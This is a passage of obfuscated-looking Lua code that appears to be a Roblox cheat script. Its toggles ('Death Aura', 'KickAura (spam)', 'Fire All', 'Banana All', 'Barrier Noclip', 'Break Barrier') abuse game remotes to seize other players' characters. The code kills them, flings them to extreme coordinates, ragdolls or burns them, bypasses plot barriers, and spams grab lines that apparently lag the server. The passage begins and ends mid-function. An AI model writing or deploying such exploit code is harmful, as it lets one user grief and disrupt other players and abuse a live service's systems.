                                bodyPosition.D = 1250
                                bodyPosition.Position = vector
                                bodyPosition.Parent = humanoidRootPart2
                                tbl2.teleportBodie[v51] = bodyPosition

                                if tbl2.teleportGyro[v51] and tbl2.teleportGyro[v51].Parent then
                                    n2 = 12
                                else
                                    n2 = 13
                                end
                            elseif n2 == 12 then
                                tbl2.teleportGyro[v51]:Destroy()
                                n2 = 13
                            elseif n2 == 13 then
                                bodyGyro = Instance.new("BodyGyro")
                                bodyGyro.Name = "TeleportAuraBG"
                                bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                                bodyGyro.CFrame = humanoidRootPart2.CFrame
                                bodyGyro.Parent = humanoidRootPart2
                                tbl2.teleportGyro[v51] = bodyGyro
                                n2 = 6
                            elseif n2 == 14 then
                                return
                            end
                        end
                    end)

                    coroutine.resume(tbl2.teleportCoro)
                else
                    if tbl2.teleportCoro then
                        coroutine.close(tbl2.teleportCoro)
                        tbl2.teleportCoro = nil
                    end

                    for k, v46 in pairs(tbl2.teleportBodie) do
                        if v46 and v46.Parent then
                            v46:Destroy()
                        end
                    end

                    for k, v46 in pairs(tbl2.teleportGyro) do
                        if v46 and v46.Parent then
                            v46:Destroy()
                        end
                    end

                    tbl2.teleportBodie = {}
                    tbl2.teleportGyro = {}
                end
            end,
        })

        Auras:AddToggle("a5", {
            Text = "Death Aura",
            Default = false,
            Callback = function(deathAuraToggle)
                if tbl2.deathConnection then
                    tbl2.deathConnection:Disconnect()
                end

                tbl2.deathAuraToggle = deathAuraToggle
                if not deathAuraToggle then
                    return
                end

                tbl2.deathConnection = obj.RunService.Heartbeat:Connect(function()
                    for i, player in ipairs(obj.Players:GetPlayers()) do
                        if fn7(player) then
                            local character = player.Character
                            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                            local v46 = getPlayerCharacter()
                            local humanoidRootPart2 = v46 and getPlayerCharacter().HumanoidRootPart

                            if humanoidRootPart and humanoidRootPart2 and (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude <= 25 then
                                pcall(function()
                                    SetNetworkOwner:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
                                    task.wait(0.1)
                                    DestroyGrabLine:FireServer(humanoidRootPart)

                                    for i2, child in ipairs(character:GetChildren()) do
                                        if child:IsA("BasePart") then
                                            child.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                                        end
                                    end

                                    local humanoid = character:FindFirstChildOfClass("Humanoid")

                                    if humanoid then
                                        humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                                    end
                                end)
                            end
                        end
                    end
                end)
            end,
        })

        tbl2.Contuuti.cancel = function(arg, arg2)
            if tbl2.Contuuti[arg2] then
                task.cancel(tbl2.Contuuti[arg2])
                tbl2.Contuuti[arg2] = nil
            end
        end

        fn25 = function(arg, arg2)
            local flag = arg:FindFirstChild(arg2) ~= nil
            return flag
        end

        fn26 = function(arg, arg2)
            return (arg.Position - arg2.Position).Magnitude
        end

        fn27 = function(arg)
            if not arg or not arg.UserId then
                return false
            end

            local ok, result = pcall(function()
                return localPlayer:IsFriendsWith(arg.UserId)
            end)

            local flag = ok and result or false
            return flag
        end

        fn28 = function()
            local v46 = hrp_()
            local tbl11 = {}
            local position = v46.Position

            for k, player in pairs(obj.Players:GetPlayers()) do
                if player ~= localPlayer and (not tbl2.WhitelistFriends or not fn27(player)) then
                    local character = player.Character

                    if character then
                        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart then
                            local v47 = fn26(v46, humanoidRootPart)

                            if v47 <= 30 then
                                local humanoid = character:FindFirstChild("Humanoid")

                                if humanoid and humanoid.Health > 0 then
                                    table.insert(tbl11, {
                                        Player = player,
                                        Character = character,
                                        Root = humanoidRootPart,
                                        Head = character:FindFirstChild("Head"),
                                        Hum = humanoid,
                                        Distance = v47,
                                    })
                                end
                            end
                        end
                    end
                end
            end

            return tbl11
        end

        fn29 = function(arg, arg2, arg3, arg4, arg5)
            if arg == 0 then
                return {}
            end

            if arg == 1 then
                return {{X = arg2, Z = arg3}}
            end
            local tbl11 = {}
            local tbl12 = {}
            local n2 = arg4 or 8
            local n3 = arg5 or 2
            local n4 = math.max(n2, arg * 0.8 + 2)

            for i = 1, arg do
                local n5 = (i - 1) * (2 * math.pi / arg) + math.random(-0.03, 0.03)
                local n6 = n4 + math.random(-0.3, 0.3)
                local n7 = arg2 + n6 * math.cos(n5)
                local n8 = arg3 + n6 * math.sin(n5)
                local n9 = 0
                local flag = false

                while not flag and n9 < 50 do
                    flag = true
                    local vector = Vector3.new(n7, 0, n8)

                    for i2, v46 in ipairs(tbl12) do
                        local magnitude = (vector - v46).Magnitude

                        if magnitude < n3 then
                            flag = false
                            local v47 = math.atan2(n8 - arg3, n7 - arg2)
                            local n10 = (n6 + n3 - magnitude) * 0.3
                            n7 = n7 + n10 * math.cos(v47 + math.random(-0.2, 0.2))
                            n8 = n8 + n10 * math.sin(v47 + math.random(-0.2, 0.2))
                            break
                        end
                    end

                    local n10 = n9 + 1
                    n9 = n10

                    if n10 > 50 then
                        n7 = arg2 + (n4 + arg * 0.3) * math.cos(i * 1.3 + 0.5)
                        n8 = arg3 + (n4 + arg * 0.3) * math.sin(i * 1.3 + 0.5)
                        break
                    end
                end

                table.insert(tbl12, Vector3.new(n7, 0, n8))
                table.insert(tbl11, {X = n7, Z = n8})
            end

            return tbl11
        end

        fn30 = function()
            if etc.LastHouse == nil or etc.LastPlotOwner == nil or etc.LastPlotOwner.Parent == nil then
                for i = 1, 5 do
                    for k, child in pairs(obj.Workspace.Plots["Plot" .. i].PlotSign.ThisPlotsOwners:GetChildren()) do
                        if child.Value == localPlayer.Name then
                            etc.LastHouse = obj.Workspace.PlotItems["Plot" .. i]
                            etc.LastPlotOwner = child
                            return etc.LastHouse
                        end
                    end
                end
            end

            return etc.LastHouse
        end

        fn31 = function()
            local v46 = plcf()
            local cframe = v46 or CFrame.new()
            local PalletLightBrown = fn4("PalletLightBrown", cframe * CFrame.new(0, 14, 20), Vector3.zero)
            if not PalletLightBrown then
                return nil
            end
            local soundPart = fn3(PalletLightBrown, "SoundPart")
            if not soundPart then
                return nil
            end

            repeat
                SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
                task.wait(0.05)
            until fn25(soundPart, "PartOwner") or not tbl2.spamkickaura

            for k, descendant in pairs(PalletLightBrown:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    descendant.CanCollide = false
                    descendant.Transparency = 0.8
                end
            end

            PalletLightBrown.Name = "RagdollPalete"
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
            bodyVelocity.Velocity = Vector3.new(0, 900, 0)
            bodyVelocity.Parent = PalletLightBrown.SoundPart
            return PalletLightBrown
        end

        createBodyPosition = function(arg, arg2, position)
            local root = arg.Root
            local v46 = hrp_()
            if not root then
                return nil
            end

            for k, child in pairs(root:GetChildren()) do
                if child:IsA("BodyPosition") then
                    child:Destroy()
                end
            end

            local bodyPosition = Instance.new("BodyPosition")
            bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bodyPosition.P = 75000
            bodyPosition.D = 12000

            if position then
                bodyPosition.Position = position
            else
                bodyPosition.Position = v46.Position + Vector3.new(0, 15, 0)
            end

            bodyPosition.Parent = root
            return bodyPosition
        end

        fn32 = function(arg, position)
            if not arg or not arg.Root or not arg.Hum then
                return
            end

            if arg.Hum.Health <= 0 then
                return
            end
            local root = arg.Root
            local hum = arg.Hum
            local v46 = hrp_()
            root.AssemblyAngularVelocity = Vector3.zero
            root.AssemblyLinearVelocity = Vector3.zero
            hum.PlatformStand = true
            SetNetworkOwner:FireServer(root, root.CFrame)
            obj.RunService.RenderStepped:Wait()
            SetNetworkOwner:FireServer(root, root.CFrame)
            DestroyGrabLine:FireServer(root)
            obj.RunService.RenderStepped:Wait()
            SetNetworkOwner:FireServer(root, root.CFrame)

            if position then
                createBodyPosition(arg, nil, position)
            else
                createBodyPosition(arg)
            end

            if arg.Player.IsHeld and arg.Player.IsHeld.Value then
                for k, child in pairs(arg.Character:GetChildren()) do
                    if child:IsA("BasePart") then
                        if position then
                            child.CFrame = CFrame.new(position)
                        else
                            child.CFrame = v46.CFrame * CFrame.new(0, 15, 0)
                        end
                    end
                end
            end

            if tbl2.DoRagdoll and fn25(hum, "Ragdolled") and not hum.Ragdolled.Value then
                if tbl2.UsePallete then
                    local ragdollPalete = v8:FindFirstChild("RagdollPalete")
                    local v47 = ragdollPalete or fn31()

                    if v47 and v47.SoundPart then
                        if position then
                            v47.SoundPart.Position = position
                        else
                            v47.SoundPart.Position = root.Position
                        end
                    end
                end

                RagdollRemote:FireServer(root, 1)
            end

            obj.RunService.RenderStepped:Wait()
            DestroyGrabLine:FireServer(root)
        end

        KickAura:AddToggle("KickAuraT", {
            Text = "KickAura (spam)",
            Default = false,
            Callback = function(arg)
                local v46 = hrp_()

                if arg then
                    if tbl2.spamkickaura then
                        return
                    end
                    tbl2.spamkickaura = true

                    if tbl2.LineLagEnabled then
                        if tbl2.spamkickauralag then
                            tbl2.spamkickauralag = false
                            tbl2.Contuuti:cancel("LineLagThread")
                        end

                        tbl2.spamkickauralag = true
                        tbl2.Contuuti:cancel("LineLagThread")

                        tbl2.Contuuti.LineLagThread = task.spawn(function()
                            while tbl2.spamkickauralag do
                                local spawnLocation = obj.Workspace:FindFirstChild("SpawnLocation")
                                local spawn = spawnLocation or obj.Workspace:FindFirstChild("Spawn") or v46

                                if spawn then
                                    local n2 = math.random(-1000000000, 1000000000)
                                    local n3 = math.random(-1000000000, 1000000000)

                                    local tbl11 = {
                                        CFrame.new(n2, 0, n3),
                                        CFrame.new(-n2, 0, -n3),
                                        CFrame.new(n2, 0, -n3),
                                        CFrame.new(-n2, 0, n3),
                                        CFrame.new(n2 * 0.5, 0, n3 * 0.5),
                                        CFrame.new(-n2 * 0.5, 0, -n3 * 0.5),
                                    }

                                    for k, v47 in pairs(tbl11) do
                                        pcall(function()
                                            CreateGrabLine:FireServer(spawn, v47)
                                        end)
                                    end
                                end

                                task.wait()
                            end
                        end)
                    end

                    if tbl2.DoRagdoll and tbl2.UsePallete and not v8:FindFirstChild("RagdollPalete") then
                        fn31()
                    end

                    tbl2.Contuuti:cancel("LoopGrabKickThread")

                    tbl2.Contuuti.LoopGrabKickThread = task.spawn(function()
                        local tbl11 = {}
                        local tbl12 = {}
                        local n2 = 0

                        while tbl2.spamkickaura do
                            obj.RunService.RenderStepped:Wait()
                            local v47 = fn28()
                            local tbl13 = {}

                            for k, v48 in pairs(v47) do
                                tbl13[v48.Player.Name] = true
                            end

                            for k, v48 in pairs(tbl11) do
                                if not tbl13[k] then
                                    if v48.BodyPos then
                                        v48.BodyPos:Destroy()
                                    end

                                    tbl11[k] = nil
                                end
                            end

                            local now2 = tick()

                            if now2 - n2 > 0.5 or #v47 ~= #tbl11 then
                                local position = v46.Position
                                local x = position.X
                                local z = position.Z
                                local n3 = #v47

                                if n3 > 0 then
                                    Radius = 30
                                    MinDistance = 2
                                    tbl12 = fn29(n3, x, z, Radius * 0.25, MinDistance)
                                    n2 = now2
                                end
                            end

                            local n3 = 0

                            for k, v48 in pairs(v47) do
                                local n4 = n3 + 1
                                n3 = n4
                                local name = v48.Player.Name

                                if not tbl11[name] then
                                    tbl11[name] = {
                                        Player = v48.Player,
                                        Root = v48.Root,
                                        Head = v48.Head,
                                        Hum = v48.Hum,
                                        Character = v48.Character,
                                        BodyPos = nil,
                                    }
                                end

                                local v49 = tbl11[name]
                                v49.Root = v48.Root
                                v49.Head = v48.Head
                                v49.Hum = v48.Hum
                                v49.Character = v48.Character
                                local v50 = tbl12[n4]
                                local vector = nil

                                if v50 then
                                    vector = Vector3.new(v50.X, v46.Position.Y + 15, v50.Z)
                                end

                                fn32(v48, vector)
                            end

                            task.wait(0.05)
                        end

                        for k, v47 in pairs(tbl11) do
                            if v47.BodyPos then
                                v47.BodyPos:Destroy()
                            end

                            tbl11[k] = nil
                        end

                        if tbl2.LineLagEnabled then
                            tbl2.spamkickauralag = false
                            tbl2.Contuuti:cancel("LineLagThread")
                        end
                    end)
                else
                    if not tbl2.spamkickaura then
                        return
                    end
                    tbl2.spamkickaura = false
                    tbl2.Contuuti:cancel("LoopGrabKickThread")

                    if tbl2.LineLagEnabled then
                        tbl2.spamkickauralag = false
                        tbl2.Contuuti:cancel("LineLagThread")
                    end

                    local v47, v48, v49 = pairs(obj.Players:GetPlayers())
                    local v50 = v49
                    local v51 = v47
                    local v52 = v48

                    while true do
                        local v53, v54 = v51(v52, v50)
                        if v53 == nil then
                            break
                        end
                        v50 = v53

                        if v54 ~= localPlayer then
                            local character = v54.Character

                            if character then
                                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                                if humanoidRootPart then
                                    for k, child in pairs(humanoidRootPart:GetChildren()) do
                                        if child:IsA("BodyPosition") then
                                            child:Destroy()
                                        end
                                    end

                                    v50 = v53
                                end

                                local humanoid = character:FindFirstChild("Humanoid")

                                if humanoid then
                                    humanoid.PlatformStand = false
                                end
                            end
                        end
                    end
                end
            end,
        })

        KickAura:AddButton({
            Text = "SpawnPallet",
            Callback = function()
                for k, child in pairs(v8:GetChildren()) do
                    if child.Name == "RagdollPalete" then
                        DestroyToy:FireServer(child)
                    end
                end

                fn31()
            end,
        })

        KickAura:AddToggle("WhiteList", {
            Text = "WhiteList",
            Default = tbl2.WhitelistFriends,
            Callback = function(whitelistFriends)
                tbl2.WhitelistFriends = whitelistFriends
            end,
        })

        v25:AddToggle("Plaetst", {
            Text = "Pallet Sticky",
            Default = false,
            Callback = function(pStickyToggle)
                tbl2.PStickyToggle = pStickyToggle

                if pStickyToggle then
                    if not tbl2.Contuuti.PalletSticker then
                        tbl2.Contuuti.PalletSticker = workspace.ChildAdded:Connect(function(child)
                            if child.Name == "GrabParts" and tbl2.PStickyToggle then
                                local grabPart = child:FindFirstChild("GrabPart")
                                local grabPart2 = grabPart or child:WaitForChild("GrabPart", 2)
                                if not grabPart2 then
                                    return
                                end
                                local weldConstraint = grabPart2:FindFirstChildOfClass("WeldConstraint")
                                local weld = weldConstraint or grabPart2:FindFirstChildOfClass("Weld")
                                if not weld or not weld.Part1 then
                                    return
                                end
                                local part1 = weld.Part1
                                local palletLightBrown = part1:FindFirstAncestor("PalletLightBrown")
                                local flag = palletLightBrown or part1.Name == "PalletLightBrown" and part1

                                if flag and part1:IsA("BasePart") then
                                    local v46 = getCharacter()
                                    local humanoidRootPart = v46:FindFirstChild("HumanoidRootPart")
                                    if not humanoidRootPart then
                                        return
                                    end
                                    local massless = part1.Massless
                                    part1.Massless = true
                                    local attachment = Instance.new("Attachment")
                                    attachment.Parent = humanoidRootPart
                                    local attachment2 = Instance.new("Attachment")
                                    attachment2.Parent = part1
                                    local alignPosition = Instance.new("AlignPosition")
                                    alignPosition.Mode = Enum.PositionAlignmentMode.TwoAttachment
                                    alignPosition.Attachment0 = attachment
                                    alignPosition.Attachment1 = attachment2
                                    alignPosition.MaxForce = 999999
                                    alignPosition.Responsiveness = 200
                                    alignPosition.Enabled = false
                                    alignPosition.Parent = part1
                                    local alignOrientation = Instance.new("AlignOrientation")
                                    alignOrientation.Mode = Enum.OrientationAlignmentMode.TwoAttachment
                                    alignOrientation.Attachment0 = attachment
                                    alignOrientation.Attachment1 = attachment2
                                    alignOrientation.MaxTorque = 999999
                                    alignOrientation.Responsiveness = 200
                                    alignOrientation.Enabled = false
                                    alignOrientation.Parent = part1
                                    local flag2 = false

                                    local connection2 = obj.RunService.Heartbeat:Connect(function()
                                        if not v46 or not humanoidRootPart:IsDescendantOf(workspace) then
                                            return
                                        end
                                        local flag3 = false
                                        local humanoid = v46:FindFirstChildOfClass("Humanoid")

                                        if humanoid and humanoid.FloorMaterial ~= Enum.Material.Air then
                                            local position = humanoidRootPart.Position
                                            local vector = Vector3.new(0, -4, 0)
                                            local raycastParams = RaycastParams.new()
                                            raycastParams.FilterDescendantsInstances = {v46}
                                            raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                                            local hit = workspace:Raycast(position, vector, raycastParams)

                                            if hit and hit.Instance then
                                                local palletLightBrown2 = hit.Instance:FindFirstAncestor("PalletLightBrown")
                                                local instance = palletLightBrown2 or hit.Instance.Name == "PalletLightBrown" and hit.Instance
                                                flag3 = instance == flag
                                            end
                                        end

                                        if flag3 and tbl2.PStickyToggle then
                                            if not flag2 then
                                                attachment.CFrame = humanoidRootPart.CFrame:ToObjectSpace(part1.CFrame)
                                                alignPosition.Enabled = true
                                                alignOrientation.Enabled = true
                                                flag2 = true
                                            end
                                        elseif flag2 then
                                            alignPosition.Enabled = false
                                            alignOrientation.Enabled = false
                                            flag2 = false
                                        end
                                    end)

                                    local connection3 = nil

                                    connection3 = child.AncestryChanged:Connect(function(child2, parent)
                                        if not parent then
                                            if connection2 then
                                                connection2:Disconnect()
                                            end

                                            alignPosition:Destroy()
                                            alignOrientation:Destroy()
                                            attachment:Destroy()
                                            attachment2:Destroy()
                                            part1.Massless = massless
                                            connection3:Disconnect()
                                        end
                                    end)
                                end
                            end
                        end)
                    end
                elseif tbl2.Contuuti.PalletSticker then
                    tbl2.Contuuti.PalletSticker:Disconnect()
                    tbl2.Contuuti.PalletSticker = nil
                end
            end,
        })

        Tractor:AddToggle("SpeedT", {
            Text = "Speed Tractor",
            Default = false,
            Callback = function(speedTractor)
                tbl2.speedTractor = speedTractor

                if speedTractor then
                    tbl2.tractorGyro = nil
                    tbl2.tractorSpeed = 0

                    tbl2.speedTractorConn = obj.RunService.Heartbeat:Connect(function(deltaTime)
                        if not tbl2.speedTractor then
                            if tbl2.tractorGyro then
                                tbl2.tractorGyro:Destroy()
                                tbl2.tractorGyro = nil
                            end

                            tbl2.tractorSpeed = 0
                            return
                        end

                        local v46 = getCharacter()
                        local humanoid = v46 and v46:FindFirstChildOfClass("Humanoid")
                        if not humanoid then
                            return
                        end
                        local seatPart = humanoid.SeatPart

                        if seatPart and seatPart:IsA("VehicleSeat") then
                            local parent = seatPart.Parent
                            if not parent then
                                return
                            end
                            local name = parent.Name

                            if name ~= "TractorGreen" and name ~= "TractorRed" and name ~= "TractorOrange" then
                                if tbl2.tractorGyro then
                                    tbl2.tractorGyro:Destroy()
                                    tbl2.tractorGyro = nil
                                end

                                tbl2.tractorSpeed = 0
                                return
                            end

                            local primaryPart = parent.PrimaryPart
                            local v47 = primaryPart or seatPart
                            if not v47 then
                                return
                            end

                            if not tbl2.tractorGyro or tbl2.tractorGyro.Parent ~= v47 then
                                if tbl2.tractorGyro then
                                    tbl2.tractorGyro:Destroy()
                                end

                                local bodyGyro = Instance.new("BodyGyro")
                                bodyGyro.MaxTorque = Vector3.new(1000000, 0, 1000000)
                                bodyGyro.P = 50000
                                bodyGyro.D = 5000
                                bodyGyro.CFrame = v47.CFrame
                                bodyGyro.Parent = v47
                                tbl2.tractorGyro = bodyGyro
                            end

                            local tractorGyro = tbl2.tractorGyro
                            local lookVector = v47.CFrame.LookVector
                            local vector = Vector3.new(lookVector.X, 0, lookVector.Z)

                            if vector.Magnitude > 0 then
                                tractorGyro.CFrame = CFrame.new(v47.Position, v47.Position + vector.Unit)
                            end

                            v47.AssemblyAngularVelocity = Vector3.new(0, v47.AssemblyAngularVelocity.Y, 0)
                            local assemblyLinearVelocity = v47.AssemblyLinearVelocity
                            local vector2 = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
                            local throttle = seatPart.Throttle
                            local flag = math.abs(throttle) > 0
                            local n2 = flag

                            if flag then
                                local nitroActive = tbl2.nitroActive
                                n2 = nitroActive and 300 or 100
                            end

                            if not n2 then
                                n2 = 0
                            end

                            tbl2.tractorSpeed = tbl2.tractorSpeed + (n2 - tbl2.tractorSpeed) * math.clamp(deltaTime * 4, 0, 1)

                            if flag then
                                if tbl2.tractorSpeed > 0.5 then
                                    local vector3 = Vector3.new(seatPart.CFrame.LookVector.X, 0, seatPart.CFrame.LookVector.Z)

                                    if vector3.Magnitude > 0 then
                                        local unit = vector3.Unit
                                        local n3 = throttle > 0 and unit or -unit
                                        v47.AssemblyLinearVelocity = n3 * tbl2.tractorSpeed + Vector3.new(0, assemblyLinearVelocity.Y, 0)
                                    end
                                end
                            else
                                local vector3 = vector2.Magnitude > 0.5 and vector2.Unit * -1 * 80 * deltaTime or Vector3.zero
                                v47.AssemblyLinearVelocity = assemblyLinearVelocity + vector3
                            end

                            return
                        end

                        if tbl2.tractorGyro then
                            tbl2.tractorGyro:Destroy()
                            tbl2.tractorGyro = nil
                        end

                        tbl2.tractorSpeed = 0
                    end)
                else
                    if tbl2.speedTractorConn then
                        tbl2.speedTractorConn:Disconnect()
                        tbl2.speedTractorConn = nil
                    end

                    if tbl2.tractorGyro then
                        tbl2.tractorGyro:Destroy()
                        tbl2.tractorGyro = nil
                    end

                    tbl2.tractorSpeed = 0
                end
            end,
        })

        Tractor:AddLabel("Tractor Nitro"):AddKeyPicker("KeyPicker", {
            Default = "RightShift",
            Mode = "Hold",
            WaitForCallback = false,
            Text = "Tractor Nitro23",
            Callback = function(nitroActive)
                tbl2.nitroActive = nitroActive
            end,
        })

        Tractor:AddLabel("Tractor Jump"):AddKeyPicker("TractorJump", {
            Default = "",
            Mode = "Press",
            WaitForCallback = false,
            Text = "Tractor Jump23",
            Callback = function()
                local v46 = getCharacter()
                local humanoid = v46 and v46:FindFirstChildOfClass("Humanoid")
                if not humanoid or not humanoid.SeatPart or not humanoid.SeatPart:IsA("VehicleSeat") then
                    return
                end
                local seatPart = humanoid.SeatPart
                local parent = seatPart.Parent
                if not parent then
                    return
                end
                local name = parent.Name
                if name ~= "TractorGreen" and name ~= "TractorRed" and name ~= "TractorOrange" then
                    return
                end
                local primaryPart = parent.PrimaryPart
                local v47 = primaryPart or seatPart
                if not v47 then
                    return
                end
                v47.AssemblyLinearVelocity = Vector3.new(v47.AssemblyLinearVelocity.X, 100, v47.AssemblyLinearVelocity.Z)
            end,
        })

        v26:AddButton({
            Text = "Break Barrier",
            Func = function()
                if InPlot.Value and not InOwnedPlot.Value then
                    InPlot:GetPropertyChangedSignal("Value"):Wait()
                end

                if not CanSpawnToy.Value then
                    CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                end

                local v46 = plcf()
                local cframe = v46 or CFrame.new()
                local n2 = cframe * CFrame.new(0, 14, 20)
                task.spawn(fn4, "FoodHamburger", n2, Vector3.zero)
                local v47

                if InOwnedPlot.Value then
                    local v48 = fn30()
                    local foodHamburger = v48

                    if v48 then
                        local foodHamburger2 = v48:FindFirstChild("FoodHamburger")
                        foodHamburger = foodHamburger2 or v48:WaitForChild("FoodHamburger", 2.5)
                    end

                    v47 = foodHamburger
                else
                    local foodHamburger = SpawnedInToys:FindFirstChild("FoodHamburger")
                    local foodHamburger2 = foodHamburger or SpawnedInToys:WaitForChild("FoodHamburger", 2.5)
                    v47 = foodHamburger2
                end

                if not v47 then
                    return
                end
                local holdPart = v47:FindFirstChild("HoldPart")
                local holdPart2 = holdPart or v47:WaitForChild("HoldPart", 10)
                local holdItemRemoteFunction = holdPart2

                if holdPart2 then
                    local holdItemRemoteFunction2 = holdPart2:FindFirstChild("HoldItemRemoteFunction")
                    holdItemRemoteFunction = holdItemRemoteFunction2 or holdPart2:WaitForChild("HoldItemRemoteFunction", 10)
                end

                if holdItemRemoteFunction then
                    local pivot = getCharacter():GetPivot()
                    holdItemRemoteFunction:InvokeServer(v47, getCharacter())
                    getCharacter():PivotTo(workspace.Plots.Plot3.PlotArea.CFrame)
                    task.wait(0.1)
                    getCharacter():PivotTo(pivot)
                    DestroyToy:FireServer(v47)
                end
            end,
        })

        v26:AddToggle("BarrierNoclip", {
            Text = "Barrier Noclip",
            Default = false,
            Callback = function(arg)
                local canCollide

                if arg then
                    canCollide = false
                else
                    canCollide = true
                end

                local v46, v47, v48 = ipairs(obj.Workspace.Plots:GetChildren())
                local v49 = v48
                local v50 = v46
                local v51 = v47

                while true do
                    local v52, v53 = v50(v51, v49)
                    if v52 == nil then
                        break
                    end
                    v49 = v52
                    local barrier = v53:FindFirstChild("Barrier")

                    if barrier then
                        for i, child in ipairs(barrier:GetChildren()) do
                            if child:IsA("BasePart") then
                                child.CanCollide = canCollide
                            end
                        end

                        v49 = v52
                    end
                end
            end,
        })

        v27:AddToggle("FireT", {
            Text = "Fire All",
            Default = false,
            Callback = function(fireAllT)
                tbl2.FireAllT = fireAllT

                if fireAllT then
                    task.spawn(function()
                        while tbl2.FireAllT do
                            fn4("Campfire", hrp_().CFrame * CFrame.new(0, 3, 4), Vector3.zero)
                            local v46 = obj.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
                            local campfire = v46:WaitForChild("Campfire", 3)
                            if not campfire or not tbl2.FireAllT then
                                break
                            end
                            campfire.Name = "CampFireAll"
                            task.wait(0.1)

                            if campfire:FindFirstChild("SoundPart") then
                                SetNetworkOwner:FireServer(campfire.SoundPart, hrp_().CFrame)
                            end

                            while tbl2.FireAllT and campfire and campfire.Parent == v46 do
                                for i, player in ipairs(obj.Players:GetPlayers()) do
                                    if not tbl2.FireAllT or not campfire or campfire.Parent ~= v46 then
                                        break
                                    end

                                    if player ~= localPlayer and not fn8(player) then
                                        local character = player.Character

                                        if character then
                                            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                                            if humanoidRootPart then
                                                if campfire and campfire:FindFirstChild("SoundPart") then
                                                    campfire.SoundPart.CFrame = humanoidRootPart.CFrame
                                                end

                                                task.wait(0.1)
                                            end
                                        end
                                    end
                                end

                                task.wait(0.05)
                            end

                            if not tbl2.FireAllT then
                                if campfire and campfire.Name == "CampFireAll" then
                                    DestroyToy:FireServer(campfire)
                                end

                                break
                            end

                            continue
                        end
                    end)
                end
            end,
        })

        v27:AddToggle("FireWhite", {
            Text = "Whitelist",
            Default = tbl2.FireallWhitelist,
            Callback = function(fireallWhitelist)
                tbl2.FireallWhitelist = fireallWhitelist
            end,
        })

        v28:AddToggle("BananaT", {
            Text = "Banana All",
            Default = false,
            Callback = function(ragdollAllT)
                local v46 = getCharacter()
                tbl2.RagdollAllT = ragdollAllT

                if ragdollAllT then
                    task.spawn(function()
                        local foodBanana = nil
                        local v47 = nil

                        while tbl2.RagdollAllT do
                            task.wait(0.05)
                            local tbl11 = {}

                            for i, player in ipairs(obj.Players:GetPlayers()) do
                                if player ~= localPlayer and not fn9(player) and not fn6(player) and player.Character and player.Character:FindFirstChild("Left Leg") then
                                    table.insert(tbl11, player)
                                end
                            end

                            if #tbl11 == 0 then
                                task.wait(0.5)
                                continue
                            end
                            local leftLeg = tbl11[math.random(1, #tbl11)].Character:FindFirstChild("Left Leg")
                            local leftFootAttachment = leftLeg and leftLeg:FindFirstChild("LeftFootAttachment")

                            if leftFootAttachment then
                                if foodBanana and not foodBanana.Parent then
                                    foodBanana = nil
                                else
                                    foodBanana = SpawnedInToys:FindFirstChild("FoodBanana")
                                end

                                local soundPart = foodBanana and foodBanana:FindFirstChild("SoundPart")
                                local v48 = soundPart

                                if not soundPart then
                                    for k, child in pairs(SpawnedInToys:GetChildren()) do
                                        if child.Name == "FoodBanana" then
                                            DestroyToy:FireServer(child)
                                        end
                                    end

                                    if InPlot.Value and not InOwnedPlot.Value then
                                        InPlot:GetPropertyChangedSignal("Value"):Wait()
                                    end

                                    if not CanSpawnToy.Value then
                                        CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                                    end

                                    local n2 = hrp_().CFrame * CFrame.new(0, 14, 20)
                                    local value = InOwnedPlot.Value
                                    local lastHouse = value and tbl2.LastHouse or SpawnedInToys

                                    if lastHouse then
                                        local v49 = nil

                                        local connection2 = lastHouse.ChildAdded:Connect(function(child)
                                            if child.Name == "FoodBanana" then
                                                v49 = child
                                            end
                                        end)

                                        pcall(function()
                                            fn4("FoodBanana", n2, Vector3.zero)
                                        end)

                                        local now2 = tick()

                                        repeat
                                            task.wait()
                                        until v49 or tick() - now2 > 1.5

                                        connection2:Disconnect()
                                        foodBanana = v49
                                    end

                                    if not foodBanana then
                                        continue
                                    end
                                    local soundPart2 = foodBanana:FindFirstChild("SoundPart")
                                    local soundPart3 = soundPart2 or foodBanana:WaitForChild("SoundPart", 2)
                                    if not soundPart3 then
                                        continue
                                    end
                                    local holdPart = foodBanana:FindFirstChild("HoldPart")
                                    local holdPart2 = holdPart or foodBanana:WaitForChild("HoldPart", 2)

                                    if holdPart2 then
                                        local holdItemRemoteFunction = holdPart2:FindFirstChild("HoldItemRemoteFunction")
                                        local holdItemRemoteFunction2 = holdItemRemoteFunction or holdPart2:WaitForChild("HoldItemRemoteFunction")

                                        if holdItemRemoteFunction2 then
                                            holdItemRemoteFunction2:InvokeServer(foodBanana, v46)
                                        end
                                    end

                                    UseRemote:FireServer(foodBanana)

                                    while tbl2.RagdollAllT and foodBanana:FindFirstChild("EdiblePart") ~= nil do
                                        task.wait()
                                    end

                                    if not tbl2.RagdollAllT then
                                        break
                                    end
                                    UseRemote:FireServer(foodBanana)

                                    if holdPart2 then
                                        local dropItemRemoteFunction = holdPart2:FindFirstChild("DropItemRemoteFunction")
                                        local dropItemRemoteFunction2 = dropItemRemoteFunction or holdPart2:WaitForChild("DropItemRemoteFunction")

                                        if dropItemRemoteFunction2 then
                                            dropItemRemoteFunction2:InvokeServer(foodBanana, v46:GetPivot() * CFrame.new(0, 15, -10), Vector3.zero)
                                        end
                                    end

                                    local soundPart4

                                    repeat
                                        soundPart4 = foodBanana and foodBanana:FindFirstChild("SoundPart")
                                        v48 = soundPart4
                                        if not soundPart4 then
                                            break
                                        end
                                        SetNetworkOwner:FireServer(v48, v48.CFrame)
                                        task.wait()
